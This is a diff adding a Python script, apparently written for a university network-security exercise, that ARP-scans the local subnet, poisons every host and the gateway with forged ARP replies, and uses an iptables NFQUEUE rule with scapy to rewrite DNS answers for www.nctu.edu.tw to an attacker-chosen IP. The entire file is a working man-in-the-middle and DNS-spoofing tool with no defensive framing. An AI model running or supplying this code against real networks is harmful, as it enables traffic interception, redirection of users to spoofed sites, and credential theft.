@@ -1,0 +1,92 @@
+#!/usr/bin/env python
+import socket 
+from scapy.all import *
+import scapy.all as scapy
+import time
+import sys
+import argparse
+import netifaces
+import os
+import netfilterqueue
+
+
+dns_hosts = {
+    b"www.google.com.": "140.113.207.246",
+    b"google.com.": "140.113.207.246",
+    b"www.nctu.edu.tw." : "140.113.207.246"
+}
+def scan(ip):
+	arp_request = scapy.ARP(pdst=ip)
+	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+	arp_request_broadcast = broadcast/arp_request
+	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+	client_list = []
+	for element in answered_list:
+		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
+		client_list.append(client_dict)
+	return client_list
+
+def print_result(results_list):
+	print("IP\t\t\tMAC Address\n-----------------------------------------")
+	for client in results_list:
+		print(client["ip"] + "\t\t" + client["mac"])
+
+def process_packet(packet):
+	scapy_packet = scapy.IP(packet.get_payload())
+	if scapy_packet.haslayer(scapy.DNSRR):
+		# print(scapy_packet.show())
+		qname = scapy_packet[scapy.DNSQR].qname
+		print(qname)
+		if "www.nctu.edu.tw" in qname:
+			print("[+] Spoofing target")
+			answer = scapy.DNSRR(rrname=qname, rdata="140.113.207.246")
+			scapy_packet[scapy.DNS].an = answer
+			scapy_packet[scapy.DNS].ancount = 1
+
+			del scapy_packet[scapy.IP].len
+			del scapy_packet[scapy.IP].chksum
+			del scapy_packet[scapy.UDP].chksum
+			del scapy_packet[scapy.UDP].len
+
+			packet.set_payload(str(scapy_packet))
+
+	packet.accept()
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.connect(("8.8.8.8", 80))
+#print("scanner ip: " + s.getsockname()[0])
+ipaddr = s.getsockname()[0]
+s.close()
+results = scan(ipaddr+"/24")
+routerip = results[0]["ip"]
+routermac= results[0]["mac"]
+results.remove(results[0])
+print_result(results)
+#print(routerip)
+
+
+try:
+	pid = os.fork()
+	if pid == 0:
+		QUEUE_NUM = 0
+		# insert the iptables FORWARD rule
+		os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+		queue = netfilterqueue.NetfilterQueue()
+		queue.bind(0, process_packet)
+		print("wtf")
+		queue.run()
+	else:
+		print("hi")
+		while True:
+			for victim in results:
+				fkrespvict = scapy.ARP(op=2, pdst = victim["ip"], hwdst=victim["mac"], psrc=routerip)
+				scapy.send(fkrespvict, verbose=False)
+				fkresprout = scapy.ARP(op=2, pdst = routerip, hwdst=routermac, psrc=victim["ip"])
+				scapy.send(fkresprout, verbose=False)
+			#print(" \r[+] Packets sent: " + str(send_packets_count)),
+			#sys.stdout.flush()
+			time.sleep(0.1)
+except KeyboardInterrupt:
+	print("bye")
+	os.system("iptables --flush")
